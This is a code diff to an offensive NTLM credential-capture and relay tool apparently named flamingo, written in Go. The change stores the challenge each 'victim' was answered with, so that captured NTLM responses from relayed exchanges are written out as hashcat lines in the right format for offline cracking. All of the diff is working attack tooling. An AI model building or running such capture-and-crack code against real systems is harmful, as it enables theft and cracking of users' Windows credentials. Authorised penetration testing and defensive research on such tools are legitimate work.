@@ -98,6 +98,12 @@ type NTLMExchange struct {
 	Flags         uint32
 	ClientVersion string
 
+	// Type2 is the CHALLENGE message the victim was actually answered with,
+	// filled in once the responder has supplied it. For a relayed exchange
+	// that is the target's challenge rather than flamingo's, which is what
+	// the hashcat line has to be formatted against.
+	Type2 []byte
+
 	// Conn is the victim's connection, or nil for a server that does not
 	// surface one. The HTTP-framed listeners (WinRM, WinRMS) leave it nil
 	// because an exchange spans more than one request.
@@ -281,6 +287,7 @@ func (c *NTLMCapture) exchange(a relay.AuthResult, done chan struct{}) {
 		log.Debugf("%s no challenge for %s: %s", c.Proto, x.RemoteAddr, err)
 		return
 	}
+	x.Type2 = challenge
 
 	timeout := time.NewTimer(c.timeout())
 	defer timeout.Stop()
@@ -356,7 +363,9 @@ func (c *NTLMCapture) record(x *NTLMExchange, a *NTLMAuth) {
 		"workstation":  a.Workstation,
 		"ntlm_version": a.NTLMVersion(),
 	}
-	if line, mode := NTLMHashcat(a); line != "" {
+	// The line is formatted against the challenge the victim was actually
+	// answered with, which for a relayed exchange is the target's.
+	if line, mode := NTLMHashcatChallenge(a, NTLMServerChallenge(x.Type2)); line != "" {
 		fields["hashcat"] = line
 		fields["hashcat_mode"] = strconv.Itoa(mode)
 	}
